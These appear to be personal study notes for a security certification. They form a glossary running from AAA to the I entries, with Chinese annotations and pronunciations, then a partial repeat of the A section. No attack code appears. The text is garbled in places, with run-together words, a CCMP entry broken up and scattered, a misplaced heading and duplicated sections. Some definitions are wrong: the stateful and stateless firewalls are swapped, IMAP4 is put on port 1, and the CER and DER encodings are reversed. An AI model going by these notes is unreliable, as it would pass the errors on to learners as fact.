





---

# Appendix A—Glossary ## A
- AAA—Authentication, authorization, accounting. A group of technologies used in remote access systems.
  - Authentication verifies a user’s identification.
  - Authorization determines if a user should have access.
  - Accounting tracks / records a user’s access / activity with
logs. One method of accounting is audit logs that create an
audit trail.
  - Sometimes called AAAs of security.
- ABAC—Attribute-based access control. An access control model that grants access to resources based on attributes assigned to subjects and objects. uses policies
- Acceptable use policy (AUP)—A policy defining proper system usage and the rules of behavior for employees. It often describes
the purpose of computer systems and networks, how users can access them, and the responsibilities of users when accessing the systems.
- Access point (AP)—A device that connects wireless clients to wireless networks. also called wireless access point (WAP).
- ACLs—Access control lists. Lists of rules used by routers and stateless firewalls. These devices use the ACL to control traffic based on networks, subnets, IP addresses, ports, and protocols.
- active reconnaissance /rɪ'kɒnɪs(ə)ns/ —A penetration testing method used to collect information. It sends data to systems and analyzes responses to gain information on the target. Compare with passive reconnaissance.
        - ad hoc mode 無線隨意網路 —A connection mode, wireless devices connect to each other without an AP.
  - infrastructure mode. wireless devices connect through an AP
- administrative controls—Security controls implemented via
administrative or management methods.
- AES—Advanced Encryption Standard. A strong symmetric block cipher that encrypts data in 128-bit blocks. AES can use key sizes of 128 bits, 192 bits, or 256 bits.
- Affinity 姻亲关系;类同—A scheduling method used with load balancers. directs user requests to a specific server, uses the client’s
IP address to ensure the client is redirected to the same server during a web session.
  - round-robin scheduling scheme: allows a load balancer to send requests to servers one after another.
- Aggregation switch—A switch used to connect multiple switches together into a network.
  - Switches connect to - a aggregation switch - connects to a router.
- Agile/'ædʒaɪl/—Asoftwaredevelopmentlifecyclemodelthat focuses on interaction between customers, developers, and testers. Compare with waterfall.
- AH—Authentication Header. An option within IPsec to provide authentication and integrity.
- Airgap—A physical security control, provides physical isolation. Systems separated by an airgap don’t typically have any physical connections to other systems.
- ALE—Annual (annualized) loss expectancy /ɪk'spekt(ə)nsɪ/. The expected loss for a year. It is used to measure risk with ARO and
SLE in a quantitative /'kwɒntɪ,tətɪv/ risk assessment. The calculation is SLE × ARO = ALE.
- amplification attack—An attack that increases the amount of bandwidth sent to a victim.
        - Anomaly 不规则—A type of monitoring on intrusion detection and intrusion prevention systems. It detects attacks by comparing
operations against a baseline. It is also known as heuristic / ˌhjʊ(ə)'rɪstɪk/ detection.
- ANT—A proprietary /prə'praɪət(ə)rɪ/ wireless protocol used by some mobile devices. It is not an acronym.
- antispoofing—A method used on some routers to protect against spoofing attacks. A common implementation is to implement specific rules to block certain traffic.
- antivirus—Softwarethatprotectssystemsfrommalware.Although it is called antivirus software, it protects against most malware, including viruses, Trojans, worms, and more.
- application blacklist—A list of applications that a system blocks. Users are unable to install or run any applications on the list.
- application cell / application containers. A virtualization technology, runs services or applications within isolated
application cells (containers). Each container shares the kernel of the host.
- application whitelist—A list of applications that a system allows. Users are only able to install or run applications on the list.
- APT—Advanced persistent threat. A group that has both the capability and intent to launch sophisticated and targeted attacks.
- ARO—Annual (annualized) rate of occurrence. The number of times a loss is expected to occur in a year. It is used to measure risk with ALE and SLE in a quantitative risk assessment.
- arp—A command-line tool used to show and manipulate the Address Resolution Protocol (ARP) cache.
- ARP poisoning—An attack that misleads systems about the actual MAC address of a system.
- asset value—An element of a risk assessment. It identifies the value of an asset and can include any product, system, resource, or process. The value can be a specific monetary value or a subjective value.
- asymmetric encryption—A type of encryption using two keys to
encrypt and decrypt data. It uses a public key and a private key. Compare with symmetric encryption.
- attestation—A process that checks and validates the system files during the boot process. TPMs sometimes use remote attestation, sending a report to a remote system for attestation.
- audit trail 足迹 —A record of events recorded in one or more logs. When security professionals have access to all the logs, they can re-create the events that occurred leading up to a security incident.
- authentication—The process that occurs when a user proves an identity, such as with a password.
- authorization—The process of granting access to resources for users who prove their identity (such as with a username and password), based on their proven identity. ## B
- backdoor—An alternate method of accessing a system. Malware often adds a backdoor into a system after it infects it.
- background check—A check into a person’s history,
typically to determine eligibility /ˌelidʒə'biləti/ for a job.
- Backscatter analysis of DoS Attack—Backscatter本意是用 來指涉反向散射的電磁波, 粒子或者訊號, 對於阻斷服務攻擊, 攻擊 者經常修改封包當中的來源位址並送給網路中想要攻擊的對象, 被 攻擊的機器無法分辨此來源位址的真偽而根據協定內容將回應封包 傳送給此來源位址, 此回應的封包即稱為backscatter. 藉著分析這
         些回應封包的來源位址可定序阻斷服務攻擊的特徵值, 此之謂 backscatter analysis.
- banner grabbing—A method used to gain information about a remote system. It identifies the operating system and other details on the remote system.
- bcrypt—A key stretching algorithm. It is used to protect passwords. Bcrypt salts passwords with additional bits before
encrypting them with Blowfish. This thwarts /θwɔːt/ rainbow table attacks.
- BIOS—Basic Input/Output System. A computer’s firmware used to manipulate different settings such as the date and time, boot drive,
and access password. UEFI is the designated /'dɛzɪg,net/ replacement for BIOS.
- birthday—A password attack named after the birthday
paradox /'pærədɒks/ 悖论 in probability theory. The paradox states
that for any random group of 23 people, there is a 50 percent chance that 2 of them have the same birthday.
- black box test—A type of penetration test. Testers have zero knowledge of the environment prior /'praɪə/ to starting the test. Compare with gray box test and white box test.
- block cipher—An encryption method that encrypts data in fixed- sized blocks. Compare with stream cipher.
- Blowfish—A strong symmetric block cipher. It encrypts data in 64- bit blocks and supports key sizes between 32 and 448 bits. Compare with Twofish.
- bluejacking—An attack against Bluetooth devices. sending unsolicited /ʌnsə'lɪsɪtɪd/ messages to nearby Bluetooth devices.
- bluesnarfing—An attack against Bluetooth devices. Attackers gain unauthorized access to Bluetooth devices and can access all the data on the device.
- Bollards /'bɒlɑːd/—Short vertical posts that act as a barricade / 5

ˌbærɪ'keɪd/ . Bollards block vehicles but not people.
- bots—Software robots that function automatically. A botnet is a group of computers that are joined together. Attackers often use
malware to join computers to a botnet, and then use the botnet to launch attacks.
- BPA—Business partners agreement. A written agreement that details the relationship between business partners, including their obligations toward the partnership.
- bridge—A network device used to connect multiple networks together. It can be used instead of a router in some situations.
- brute force—A password attack that attempts to guess a password.
  - Online brute force attacks guess passwords of online systems.
  - Offline attacks guess passwords contained in a file or
database.
- buffer overflow—An error that occurs when an application
receives more input, or different input, than it expects. It exposes system memory that is normally inaccessible.
- businessimpactanalysis(BIA)/ə'nælɪsɪs/—Aprocessthathelpsan organization identify critical systems and components that are essential to the organization’s success.
- BYOD—Bring your own device. A mobile device deployment model. Employees can connect their personally owned device to ## C
- CA—Certificate Authority. An organization that manages, issues, and signs certificates. A CA is a main element of a PKI.
- CAC—Common Access Card. A specialized type of smart card used by the U.S. Department of Defense. It includes photo
identification and provides confidentiality, integrity, authentication, and non-repudiation.
        - Captive portal 俘虏入口—A technical solution that forces wireless clients using web browsers to complete a process before accessing
a network. It is often used to ensure users agree to an acceptable use policy or pay for access.
- carrier unlocking—The process of unlocking a mobile phone from a specific cellular /'seljʊlə/ provider.
- Electronic Codebook (ECB): Easiest. not recommended.
  - use the algorithm without any modification.
  - encrypts blocks with the same key, making it easier for attackers to
crack.
  - Example: DES, AES, Blowfish, GOST... divide the plain text into blocks
(often 64-bit or 128-bit) and encrypt each block, one at a time.
   ⁃
- CBC—Cipher Block Chaining. IV
  - A mode of operation used for encryption that effectively
converts a block cipher into a stream cipher.
  - It uses an initialization vector (IV) for the first block and each subsequent block is combined with the previous block, using an XOR operation.
  - used by some symmetric block ciphers, though it isn’t as efficient
  ⁃
 - Counter (CTM) mode: IV + counter value
  - combines an initialization vector (IV) with a counter and effectively
converts a block cipher into a stream cipher.
  - It basically works by generating a keystream block by encrypting sequential values of some counter. This counter can be any function that produces a sequence that has a long period with no repetition.
  - It combines an IV with a counter and uses the result to encrypt each plaintext block. Each block uses the same IV, but CTM combines it with the counter value, resulting in a different encryption key for each block.
  - Multiprocessor systems can encrypt or decrypt multiple blocks at the same time, allowing the algorithm to be quicker on multiprocessor or multicore systems.
  - CTM is widely used and respected as a secure mode of operation.
- Galois/Counter Mode (GCM): IV + counter value + hash
  - combines the Counter mode with hashing techniques for data authenticity and confidentiality.
  ◆
than TKIP, which was used with the original release of WPA.
- CER—Canonical Encoding Rules /kə'nɒnɪk(ə)l/ 权威的. A base
format for PKI certificates. They are binary encoded files. Compare with DER (Distinguished Encoding Rules).
- certificate—A digital file used for encryption, authentication, digital signatures, and more. Public certificates include a public key used for asymmetric encryption.
- certificatechaining—Aprocessthatcombinesallcertificates within a trust model. It includes all the certificates in the trust
chain from the root CA down to the certificate issued to the end user.
- chain of custody /'kʌstədɪ/—A process that provides assurances that evidence has been controlled and handled properly after collection.
Forensic experts establish a chain of custody when they first collect evidence.
- change management—The process used to prevent unauthorized changes. Unauthorized changes often result in unintended outages.
- CHAP—Challenge Handshake Authentication Protocol. An authentication mechanism where a server challenges a client. Compare with MS-CHAPv2 and PAP.
- chroot—A Linux command used to change the root directory. It is often used for sandboxing.
- ciphertext—The result of encrypting plaintext. Ciphertext is not in an easily readable format until it is decrypted.
- clean desk policy—A security policy requiring employees to keep their areas organized and free of papers. The goal is to reduce threats of security incidents by protecting sensitive data.
- clickjacking—An attack that tricks users into clicking something 9
CCMP—Counter Mode with Cipher Block Chaining Message
. An encryption protocol based on AES and used with WPA2 for wireless security. It is more secure
Authentication Code Protocol

other than what they think they’re clicking. using multiple transparent or opaque layers.
- Clipping level—Sets certain thresholds ⻔槛 for specific errors or mistakes allowed and the amount of these occurrences that can take place before it is considered suspicious
- Cloud access security broker (CASB)—A software tool or service that enforces cloud-based security requirements. It is placed
between the organization’s resources and the cloud, monitors all network traffic, and can enforce security policies.
- cloud deployment models—Cloud model types that identify who has access to cloud resources.
  - Public clouds are for any organization.
  - Private clouds are for a single organization.
  - Community clouds are shared among community
organizations.
  - A hybrid cloud is a combination of two or more clouds.
- code signing—The process of assigning a certificate to code. The certificate includes a digital signature and validates the code.
- cold site—An alternate location for operations. A cold site will have power and connectivity needed for activation, but little else. Compare with hot site and warm site.
- collision—A hash vulnerability that can be used to discover passwords. A hash collision occurs when two different passwords create the same hash.
- compensating controls—Security controls that are alternative controls used when a primary security control is not feasible.
- compiled code—Code that has been optimized by an application and converted into an executable file. Compare with runtime code.
- confidential data—Data meant to be kept secret among a certain group of people. example, salary data is meant to be kept secret and not shared with everyone within a company.
- confidentiality—One of the three main goals of information security known as the CIA security triad.
           - Confidentiality ensures that unauthorized entities cannot access data.
  - Encryption and access controls help protect against the loss of confidentiality.
  - Compare with availability and integrity.
- configuration compliance scanner—A type of vulnerability scanner
that verifies systems are configured correctly. It will often use a file that identifies the proper configuration for systems.
- confusion—A cryptography concept that indicates ciphertext is significantly different than plaintext.
- containerization—A method used to isolate applications in mobile devices. It isolates and protects the application, including any data used by the application.
- context-aware authentication— An authentication method using multiple elements to authenticate a user and a mobile device. It can include identity, geolocation, the device type, and more.
- continuity of operations planning—The planning process that identifies an alternate location for operations after a critical outage. It can include a hot site, cold site, or warm site.
- control diversity—The use of different security control types, such as technical controls, administrative controls, and physical controls. Compare with vendor diversity.
- controller-based AP / thin AP—An AP that is managed by a controller. Compare with fat AP.
- COPE—Corporate-owned, personally enabled. A mobile device deployment model. The organization purchases and issues devices to employees. Compare with BYOD and CYOD.
- corrective controls—Security controls that attempt to reverse the impact of a security incident.
- CRL—Certificate revocation list. A list of certificates that a CA has revoked. Certificates are commonly revoked if they are
compromised, or issued to an employee who has left the organization.
          - crossover error rate—The point where the false acceptance rate (FAR) crosses over with the false rejection rate (FRR). A lower CER indicates a more accurate biometric system.
- cross-site request forgery (XSRF) /'fɔːdʒ(ə)rɪ/ —A web application attack. XSRF attacks trick users into performing actions on web sites, such as making purchases, without their knowledge.
- cross-site scripting (XSS)—A web application vulnerability. Attackers embed malicious HTML or JavaScript code into a web site’s code, which executes when a user visits the site.
- crypto-malware—A type of ransomware 勒索软件 that encrypts the user’s data.
- crypto module—A set of hardware, software, and/or firmware that implements cryptographic functions. Compare with crypto service provider.
- crypto service provider—A software library of cryptographic standards and algorithms. These libraries are typically distributed within crypto modules.
- CSR—Certificate signing request. A method of requesting a certificate from a CA. It starts by creating an RSA-based private/ public key pair and then including the public key in the CSR.
- CTM—Counter mode. A mode of operation used for encryption that combines an IV with a counter. The combined result is used to encrypt blocks.
- custom firmware—Mobile device firmware other than the firmware provided with the device. People sometimes use custom firmware to root Android devices.
- CIRT — cyber-incident response team. A group of experts who respond to security incidents.
- CYOD—Choose your own device. A mobile device deployment model. Employees can connect their personally owned device to


---

## D
- DAC—Discretionary access control. An access control model, owners can modify permissions for the objects (files and folders). Microsoft NTFS uses the DAC model.
- data-at-rest—Any data stored on media. It’s common to encrypt sensitive data-at-rest.
- data execution prevention (DEP)—A security feature that prevents code from executing in memory regions marked as nonexecutable. It helps block malware.
- data exfiltration—The unauthorized transfer of data outside an organization.
- data-in-transit—Any data sent over a network. It’s common to encrypt sensitive data-in-transit.
- data-in-use—Any data currently being used by a computer. Because the computer needs to process the data, it is not encrypted while in use.
- data retention policy /rɪ'tenʃ(ə)n/—A security policy specifying how long data should be kept (retained).
- data sovereignty 最高统治权 /'sɒvrɪntɪ/—A term that refers to the legal implications of data stored in different countries. It is
primarily a concern related to backups stored in alternate locations via the cloud.
- DDoS—Distributed denial-of-service. An attack on a system launched from multiple sources intended to make a computer’s resources or services unavailable to users. DDoS attacks typically include sustained, abnormally high network traffic. Compare with DoS.
- dead code—Code that is never executed or used. It is often caused by logic errors.
- defense in depth—The use of multiple layers of security to protect resources.
  - Control diversity and vendor diversity are two methods
organizations implement to provide defense in depth.
- degaussing /di'ɡausiŋ/ 消磁—The process of removing data from
magnetic media using a very powerful electronic magnet. Degaussing is sometimes used to remove data from backup tapes or to destroy hard disks.
- DER—Distinguished Encoding Rules. A base format for PKI certificates. They are BASE64 ASCII encoded files. Compare with CER(Canonical Encoding Rules).
- DES—Data Encryption Standard. A legacy symmetric encryption standard used to provide confidentiality. It has been compromised and AES or 3DES should be used instead.
- detective controls—Security controls that attempt to detect security incidents after they have occurred.
- deterrent controls—Security controls that attempt to discourage individuals from causing a security incident.
- dictionary—A password attack that uses a file of words and character combinations. The attack tries every entry within the file when trying to guess a password.
- differential backup—A type of backup that backs up all the data that has changed or is different since the last full backup.
- Diffie-Hellman (DH)—An asymmetric algorithm used to privately share symmetric keys. DH Ephemeral (DHE) uses ephemeral keys,
which are re- created for each session. Elliptic Curve DHE (ECDHE) uses elliptic curve cryptography to generate encryption keys.
- diffusion—A cryptography concept that ensures that small changes in plaintext result in significant changes in ciphertext.
- dig—A command-line tool used to test DNS on Linux systems. Compare with
- nslookup.
- digital signature—An encrypted hash of a message, encrypted with the sender’s private key. It provides authentication, non- repudiation, and integrity.
- disablement policy—A policy that identifies when administrators should disable user accounts.
- disassociation attack—An attack that removes wireless clients from a wireless network.
- dissolvable agent—A NAC agent that runs on a client, but deletes itself later. It checks the client for health. Compare with permanent agent.
- DLL injection—An attack that injects a Dynamic Link Library (DLL) into memory and runs it. Attackers rewrite the DLL, inserting malicious code.
- DLP—Data loss prevention. A group of technologies used to prevent data loss. They can block the use of USB devices, monitor
outgoing email to detect and block unauthorized data transfers, and monitor data stored in the cloud.

- **DMZ**
  - Demilitarized zone.
  - A buffer zone between the Internet and an internal network. Internet clients can access the services hosted
on servers in the DMZ, but the DMZ provides a layer of protection for the internal network.

- **DNS**
  - Domain Name System.
  - A service used to resolve host names to IP addresses. DNS zones include records such as A records for IPv4 addresses and AAAA records for IPv6 addresses.

- **DNSSEC**
  - Domain Name System Security Extensions.
  - A suite of extensions to DNS used to protect the integrity of DNS records and prevent some DNS attacks.

- **DNS poisoning**
  - An attack that modifies or corrupts DNS results. DNSSEC helps prevent DNS poisoning.

- **domain hijacking**: An attack that changes the registration of a domain name without permission from the owner.

- **DoS / Denial-of-service**: An attack from a single source that 15 attempts to disrupt the services provided by the attacked system. Compare with DDoS.

- **downgrade attack**: A type of attack that forces a system to downgrade its security. The attacker then exploits the lesser security control.

- **Drive-By Downloads**: the unintended download of computer software from the Internet. happen when visiting a website, opening e-mail attachment or clicking a link, or a deceptive pop-up window, by clicking on the window in the mistaken belief that, for example, an error report from the computer's operating system itself is being acknowledged or a seemingly innocuous advertisement pop-up is being dismissed. Then the "supplier" claim that the user "consented" to the download of an unwanted or malicious software download. Similarly if a person is visiting a site with malicious content, the person may become victim to a drive- by download attack, the malicious content may be able to exploit vulnerabilities in the browser or plugins to run malicious code without the user’s knowledge.

- **Drive-by install**: a similar event. It refers to installation rather than download (though sometimes the two terms are used interchangeably).

- **DSA—Digital signature algorithm**: An encrypted hash of a message used for authentication, non- repudiation, and integrity. The sender’s private key encrypts the hash of the message.

- **dumpster diving**: The practice of searching through trash looking to gain information from discarded documents. Shredding or burning papers helps prevent the success of dumpster diving.


---


## E
- EAP—Extensible Authentication Protocol. An authentication framework that provides general guidance for authentication
methods. Variations include PEAP, EAP-TLS, EAP-TTLS, and EAP-FAST.
 - EAP-FAST—EAP-Flexible Authentication via Secure Tunneling (EAP- FAST). A Cisco-designed replacement for Lightweight EAP (LEAP). EAP- FAST supports certificates, but they are optional.
- EAP-TLS—Extensible Authentication Protocol-Transport Layer Security. An
◆
- extension of EAP sometimes used with 802.1x. This is one of the most secure EAP standards and is widely implemented. It requires certificates on the 802.1x server and on the clients.
- EAP-TTLS—Extensible Authentication Protocol-Tunneled Transport Layer Security. An extension of EAP sometimes used
with 802.1x. It allows systems to use some older authentication methods such as PAP within a TLS tunnel. It requires a certificate on the 802.1x server but not on the clients.
- ECB—Electronic Codebook. A legacy mode of operation used for encryption. It is weak and should not be used.
- embedded system—Any device that has a dedicated function and uses a computer system to perform that function. It includes a CPU, an operating system, and one or more applications.
- EMI—Electromagnetic interference. Interference caused by motors, power lines, and fluorescent lights. EMI shielding prevents outside interference sources from corrupting data and prevents data from emanating outside the cable.
- - - ◆
- EMP—Electromagnetic pulse. A short burst of energy that can potentially damage electronic equipment. It can result from electrostatic discharge (ESD), lightning, and military weapons.
- encryption—A process that scrambles, or ciphers, data to make it unreadable. Encryption normally includes a public algorithm and a private key. Compare with asymmetric and symmetric encryption.
- Enterprise—A wireless mode that uses an 802.1x server for security. It forces users to authenticate with a username and
password. Compare with Open and PSK modes.
- ephemeral key—A type of key used in cryptography. Ephemeral
keys have very short lifetimes and are re-created for each session.
- error handling—A programming process that handles errors
gracefully.
- ESP—Encapsulating Security Payload. An option within IPsec to
provide confidentiality, integrity, and authentication.
- evil twin—A type of rogue AP. An evil twin has the same SSID as
a legitimate AP.
- exit interview—An interview conducted with departing employees
just before they leave an organization.
- exploitation frameworks—Tools used to store information about
security vulnerabilities. They are often used by penetration testers (and attackers) to detect and exploit software.
- extranet—The part of an internal network shared with outside entities. Extranets are often used to provide access to authorized business partners, customers, vendors, or others.
◆F
- facial recognition—A biometric method that identifies people based on facial features.
- false negative—A security incident that isn’t detected or reported. example, a NIDS false negative occurs if an attack is active on the network
◆
- but the NIDS does not raise an alert.
- false positive—An alert on an event that isn’t a security incident. example, a NIDS false positive occurs if the NIDS raises an alert but activity on the network is normal. - FAR—False acceptance rate. Also called the false match rate. A rate that identifies the percentage of times a biometric authentication system incorrectly indicates a match.
- Faraday cage—A room or enclosure that prevents signals from emanating beyond the room or enclosure.
- fat AP / stand-alone AP—An AP that includes everything needed to connect wireless clients to a wireless network. Fat APs must be configured independently. Compare with thin AP.
- fault tolerance—The capability of a system to suffer a fault, but continue to operate. Said another way, the system can tolerate the fault as if it never occurred.
- FDE—Full disk encryption. A method to encrypt an entire disk. Compare with
- SED.
- federation—Two or more members of a federated identity management system. Used for single sign-on.
- fingerprint scanners—Biometric systems that scan fingerprints for authentication.
- firewall—A software or a network device used to filter traffic. Firewalls can be application-based (running on a host), or a network-based device. Stateful firewalls filter traffic using rules within an ACL. Stateless firewalls filter traffic based on its state within a session.
- firmware OTA updates—Over-the-air updates for mobile device firmware that keep them up to date. These are typically
downloaded to the device from the Internet and applied to update the device.
- flood guard—A method of thwarting flood attacks. On switches, a flood guard thwarts MAC flood attacks. On routers, a flood guard prevents SYN flood attacks.
- framework—A structure used to provide a foundation. Cybersecurity frameworks typically use a structure of basic
 concepts and provide guidance to professionals on how to implement security.
- FRR—False rejection rate. Also called the false nonmatch rate. A rate that identifies the percentage of times a biometric authentication system incorrectly rejects a valid match.
- FTPS—File Transfer Protocol Secure. An extension of FTP that uses TLS to encrypt FTP traffic. Some implementations of FTPS use TCP ports 989 and 990.
- full backup—A type of backup that backs up all the selected data. A full backup could be considered a normal backup.
- full tunnel—An encrypted connection used with VPNs. When a user is connected to a VPN, all traffic from the user is encrypted. Compare with split tunnel.
◆
◆G
- GCM—Galois/Counter Mode. A mode of operation used for encryption. It combines the Counter (CTM) mode with hashing techniques for data authenticity and confidentiality.
- geofencing—A virtual fence or geographic boundary. It uses GPS to create the boundary. Apps can then respond when a mobile device is within the virtual fence.
- geolocation—The location of a device identified by GPS. It can help locate a lost or stolen mobile device.
- GPO—Group Policy Object. A technology used within Microsoft Windows to manage users and computers. It is implemented on a domain controller within a domain.
- GPS—Global Positioning System. A satellite-based navigation system that identifies the location of a device or vehicle. Mobile devices often incorporate GPS capabilities.
- GPS tagging—A process of adding geographical data to files such as pictures. It typically includes latitude and longitude coordinates of the location where the picture was taken or the file was created. Gratuitous ARP: not waiting for request just sending the reply.
- gray box test—A type of penetration test. Testers have some knowledge of the environment prior to starting the test. Compare with black box test and white box test.
- group-based access control—A role-based access control method that uses groups as roles.
- Guest account—A pre-created account in Windows systems. It is disabled by default.
K
- hacktivist—An attacker who launches attacks as part of an activist movement or to further a cause.
- hardware root of trust—A known secure starting point.
  - TPMs have a private key burned into the hardware that
provides a hardware root of trust.
- hash—A number created by executing a hashing algorithm against
data, such as a file or message. Hashing is commonly used for integrity. Common hashing algorithms are MD5, SHA-1, and HMAC.
- heuristic 启发式的/behavioral—A type of monitoring on intrusion detection and intrusion prevention systems. It detects attacks by comparing traffic against a baseline. It is also known as 异常 anomaly detection.
- HIDS—Host-based intrusion detection system. Software installed on a system to detect attacks. It protects local resources on the host.
  - A host-based intrusion prevention system (HIPS) is an extension of a HIDS. It is software installed on a system to detect and block attacks.
     - high availability—A term that indicates a system or component remains available close to 100 percent of the time.
- HMAC—Hash-based Message Authentication Code. A hashing algorithm used to verify integrity and authenticity of a message
with the use of a shared secret. It is typically combined with another hashing algorithm such as SHA.
  - Hash the secret key with messages, Usually use between server and client.
  - It's much safer cause the secret key should by time limit and random. The server received the request from client, send the form and a random key to the client in the session, the client finish the form and hash it with the random secret key, then the server verify the hash stored with the hash received.
  - But the reality, a lot of key want random at all, it stores in the client devices. Decrease safety.
- hoax—A message, often circulated through email, that tells of impending doom from a virus or other security threat that simply doesn’t exist.
- home automation—Smart devices used within the home that have IP addresses. These are typically accessible via the Internet and are part of the Internet of things (IoT).
- honeypot—A server designed to attract an attacker. It typically has weakened security encouraging attackers to investigate it.
- honeynet—A group of honeypots in a network. Honeynets are often configured in virtual networks.
- hot and cold aisles—A method commonly used in data centers to keep equipment cool. Cool air flows from the front of the cabinets
to the back, making the front aisle cooler and the back aisle warmer.
- HOTP—HMAC-based One-Time Password. An open standard used for creating one-time passwords. It combines a secret key and a counter, and then uses HMAC to create a hash of the result.
- hot site—An alternate location for operations. A hot site typically includes everything needed to be operational within 60 minutes.
 Compare with cold site and warm site.
- HSM—Hardware security module. A removable or external device
that can generate, store, and manage RSA keys used in asymmetric encryption. Compare with TPM.
- HTTPS—Hypertext Transfer Protocol Secure. A protocol used to encrypt HTTP traffic. HTTPS encrypts traffic with TLS using TCP port 443.
- HVAC—Heating, ventilation, and air conditioning. A physical security control that increases availability by regulating airflow within data centers and server rooms.
I
- IaaS—Infrastructure as a Service. A cloud computing model that allows an organization to rent access to hardware in a self- managed platform. Compare with PaaS and SaaS.
- ICS—Industrialcontrolsystem.Asystemthatcontrolslarge systems such as power plants or water treatment facilities. A SCADA system controls the ICS.
- identification—The process that occurs when a user claims an identity, such as with a username.
- IEEE 802.1x—An authentication protocol used in VPNs and wired and wireless networks. VPNs often implement it as a RADIUS
server. Wired networks use it for port-based authentication. Wireless networks use it in Enterprise mode. It can be used with certificate-based authentication.
- ifconfig—A command-line tool used on Linux systems to show and manipulate settings on a network interface card (NIC). Similar to ipconfig used on Windows systems.
- IMAP4—Internet Message Access Protocol version 4. A protocol used to store and manage email on servers. IMAP4 uses TCP port 1.   Secure IMAP4 uses TLS to encrypt IMAP4 traffic.
- impact—The magnitude of harm related to a risk. It is the negative
result of an event, such as the loss of confidentiality, integrity, or availability of a system or data. Compare with likelihood of occurrence.
- implicit deny—A rule in an ACL that blocks all traffic that hasn’t been explicitly allowed. The implicit deny rule is the last rule in an ACL.
◆
- Incident response. The process of responding to a security incident. Organizations often create an incident response plan that outlines the procedures to be used when responding to an incident.
- incident response plan (IRP)—The procedures documented in an incident response policy.
- incident response process—The phases of incident response, including preparation, identification, containment, eradication, recovery, and lessons learned.
- incremental backup—A type of backup that backs up all the data that has changed since the last full or incremental backup.
- injection attack—An attack that injects code or commands. Common injection attacks are DLL injection, command injection, and SQL injection attacks.
- inline—A configuration that forces traffic to pass through a device. A NIPS is placed inline, allowing it to prevent malicious traffic
from entering a network. Sometimes called in-band. Compare with out- of-band.
- input validation—A programming process that verifies data is valid before using it.
- insider—An attacker who launches attacks from within an organization, typically as an employee.
- integer overflow—An application attack that attempts to use or create a numeric value that is too big for an application to handle. Input handling and error handling thwart the attack.
- integrity—One of the three main goals of information security
known as the CIA security triad. Integrity provides assurance that data or system configurations have not been modified. Audit logs and hashing are two methods used to ensure integrity. Compare with availability and confidentiality.
- intranet—An internal network. People use an intranet to communicate and share content with each other.
- IoT—Internet of things. The network of physical devices connected to the Internet. It typically refers to smart devices with an IP address, such as wearable technology and home automation systems.
- ip—A command-line tool used on Linux systems to show and manipulate settings on a network interface card (NIC). Developers created this to replace ifconfig.
- ipconfig—A command-line tool used on Windows systems to show the configuration settings on a NIC.
- IPsec—Internet Protocol security. A suite of protocols used to encrypt data-in- transit that can operate in both Tunnel mode and
Transport mode. It uses Tunnel mode for VPN traffic and Transport mode in private networks.
- IP spoofing—An attack that changes the source IP address.
- iris scanners—Biometric systems that scan the iris of an eye for authentication.
- ISA—Interconnection security agreement. An agreement that specifies technical and security requirements for connections between two or more entities. Compare with MOU/MOA.
- IV (initialization vector) attack—A wireless attack that attempts to discover
◆◆


## Appendix A—Glossary
 3DES—Triple Digital Encryption Standard. A symmetric algorithm used to encrypt data and provide confidentiality. It is a block cipher that encrypts data in 64-bit blocks.
A
AAA—Authentication, authorization, and accounting. A group of technologies used in remote access systems. Authentication verifies a user’s identification. Authorization determines if a user should have access. Accounting tracks a user’s access with logs. Sometimes called AAAs of security.
ABAC—Attribute-based access control. An access control model that grants access to resources based on attributes assigned to subjects and objects. uses policies
Acceptable use policy (AUP)—A policy defining proper system usage and the rules of behavior for employees. It often describes the purpose of computer systems and networks, how users can access them, and the responsibilities of users when accessing the systems.
Access point (AP)—A device that connects wireless clients to wireless networks. also called wireless access point (WAP).
accounting—The process of tracking the activity of users and recording this activity in logs. One method of accounting is audit logs that create an audit trail.
ACLs—Access control lists. Lists of rules used by routers and stateless firewalls. These devices use the ACL to control traffic based on networks, subnets, IP addresses, ports, and some protocols.
active reconnaissance /rɪ'kɒnɪs(ə)ns/ —A penetration testing method used to collect information. It sends data to systems and analyzes responses to gain information on the target. Compare with passive reconnaissance.
ad hoc—A connection mode used by wireless devices without an AP. When wireless devices connect through an AP, they are using infrastructure mode.
administrative controls—Security controls implemented via administrative or management methods. AES—Advanced Encryption Standard. A strong symmetric block cipher that encrypts data in 128-bit blocks. AES can use key sizes of 128 bits, 192 bits, or 256 bits.
affinity—A scheduling method used with load balancers. It uses the client’s IP address to ensure the client is redirected to the same server during a session.
aggregation switch—A switch used to connect multiple switches together into a network. Switches connect to the aggregation switch and it connects to a router.
agile—A software development life cycle model that focuses on interaction between customers, developers, and testers. Compare with waterfall.
AH—Authentication Header. An option within IPsec to provide authentication and integrity.
airgap—A physical security control that provides physical isolation. Systems separated by an airgap don’t typically have any physical connections to other systems.
ALE—Annual (or annualized) loss expectancy. The expected loss for a year. It is used to measure risk with ARO and SLE in a quantitative risk assessment. The calculation is SLE × ARO = ALE.
amplification attack—An attack that increases the amount of bandwidth sent to a victim.
anomaly—A type of monitoring on intrusion detection and intrusion prevention systems. It detects attacks by comparing operations against a baseline. It is also known as heuristic detection.
ANT—A proprietary wireless protocol used by some mobile devices. It is not an acronym.
antispoofing—A method used on some routers to protect against spoofing attacks. A common implementation is to implement specific rules to block certain traffic.
antivirus—Software that protects systems from malware. Although it is called antivirus software, it protects against most malware, including viruses, Trojans, worms, and more.
application blacklist—A list of applications that a system blocks. Users are unable to install or run any applications on the list.
application cell—Also known as application containers. A virtualization technology that runs services or applications within isolated application cells (or containers). Each container shares the kernel of the host. application whitelist—A list of applications that a system allows. Users are only able to install or run applications on the list.
APT—Advanced persistent threat. A group that has both the capability and intent to launch sophisticated and targeted attacks.
ARO—Annual (or annualized) rate of occurrence. The number of times a loss is expected to occur in a year. It is used to measure risk with ALE and SLE in a quantitative risk assessment.
arp—A command-line tool used to show and manipulate the Address Resolution Protocol (ARP) cache.
ARP poisoning—An attack that misleads systems about the actual MAC address of a system.
asset value—An element of a risk assessment. It identifies the value of an asset and can include any product, system, resource, or process. The value can be a specific monetary value or a subjective value. asymmetric encryption—A type of encryption using two keys to encrypt and decrypt data. It uses a public key and a private key. Compare with symmetric encryption.
attestation—A process that checks and validates system files during the boot process. TPMs sometimes use remote attestation, sending a report to a remote system for attestation.
audit trail—A record of events recorded in one or more logs. When security professionals have access to all the logs, they can re-create the events that occurred leading up to a security incident. authentication—The process that occurs when a user proves an identity, such as with a password.
authorization—The process of granting access to resources for users who prove their identity (such as with a username and password), based on their proven identity.
